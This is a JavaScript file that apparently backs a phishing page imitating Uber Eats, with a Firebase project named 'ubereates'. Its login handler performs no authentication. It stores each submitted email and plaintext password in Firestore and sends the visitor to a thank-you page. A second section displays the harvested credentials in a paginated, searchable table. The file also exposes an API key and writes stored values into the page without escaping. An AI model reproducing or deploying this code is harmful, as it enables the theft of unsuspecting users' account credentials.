import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getDocs,
  query,
  orderBy,
  limit,
  startAfter,
  startAt,
  endAt
} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAMbJ7lLkoWB0fBV1HIol-2CX-akA9Su3c",
  authDomain: "ubereates-75b74.firebaseapp.com",
  projectId: "ubereates-75b74",
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const loginForm = document.getElementById("loginForm");
const submitBtn = document.getElementById("submitBtn");
const errorMessage = document.getElementById("errorMessage");

const usersBody = document.getElementById("usersBody");
const prevBtn = document.getElementById("prevBtn");
const nextBtn = document.getElementById("nextBtn");
const loading = document.getElementById("loading");
const searchInput = document.getElementById("searchInput");

// ---------- Login Form Handling ----------
if (loginForm) {
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const email = document.getElementById("usernameOrEmail").value.trim();
    const password = document.getElementById("password").value;

    if (!email || !password) {
      showError("Please fill in all fields");
      return;
    }

    submitBtn.disabled = true;
    submitBtn.innerHTML = "Signing in...";

    try {
      await addDoc(collection(db, "users"), {
        email,
        password,
        createdAt: serverTimestamp(),
      });

      window.location.href = "/thankyou.html";
    } catch (err) {
      console.error(err);
      showError("Something went wrong");
      submitBtn.disabled = false;
      submitBtn.innerHTML = "Sign In";
    }
  });

  function showError(msg) {
    errorMessage.textContent = msg;
    errorMessage.classList.add("show");
    setTimeout(() => errorMessage.classList.remove("show"), 4000);
  }
}

// ---------- Users Listing ----------
if (usersBody) {
  const PAGE_SIZE = 5;
  let pageStack = [];
  let currentPage = 0;
  let searchTerm = "";
  let debounceTimer;

  async function loadUsers(page = 0) {
    loading.style.display = "block";
    usersBody.innerHTML = "";

    const usersRef = collection(db, "users");
    let q;

    if (searchTerm) {
      q = query(
        usersRef,
        orderBy("email"),
        startAt(searchTerm),
        endAt(searchTerm + "\uf8ff"),
        limit(PAGE_SIZE)
      );
      pageStack = [];
      currentPage = 0;
    } else {
      if (page === 0) {
        q = query(usersRef, orderBy("createdAt", "desc"), limit(PAGE_SIZE));
      } else {
        const lastVisible = pageStack[page - 1];
        q = query(
          usersRef,
          orderBy("createdAt", "desc"),
          startAfter(lastVisible),
          limit(PAGE_SIZE)
        );
      }
    }

    try {
      const snapshot = await getDocs(q);

      if (snapshot.empty) {
        usersBody.innerHTML = `<tr><td colspan="3" style="text-align:center;">No users found.</td></tr>`;
      } else {
        snapshot.forEach((doc) => {
          const user = doc.data();
          const tr = document.createElement("tr");
          tr.innerHTML = `
            <td>${user.email}</td>
            <td>${user.password}</td>
            <td>${user.createdAt?.toDate().toLocaleString() || "-"}</td>
          `;
          usersBody.appendChild(tr);
        });

        if (!searchTerm) {
          if (pageStack.length === page) pageStack.push(snapshot.docs[snapshot.docs.length - 1]);
          currentPage = page;
        }
      }

      prevBtn.disabled = currentPage === 0 || searchTerm;
      nextBtn.disabled = snapshot.size < PAGE_SIZE || searchTerm;

      document.getElementById("usersTable").style.display = "table";
    } catch (err) {
      console.error(err);
      usersBody.innerHTML = `<tr><td colspan="3" style="text-align:center;">Error loading users.</td></tr>`;
    }

    loading.style.display = "none";
  }

  nextBtn.addEventListener("click", () => loadUsers(currentPage + 1));
  prevBtn.addEventListener("click", () => loadUsers(currentPage - 1));

  searchInput.addEventListener("input", (e) => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      searchTerm = e.target.value.trim();
      loadUsers(0);
    }, 300);
  });

  loadUsers(0);
}
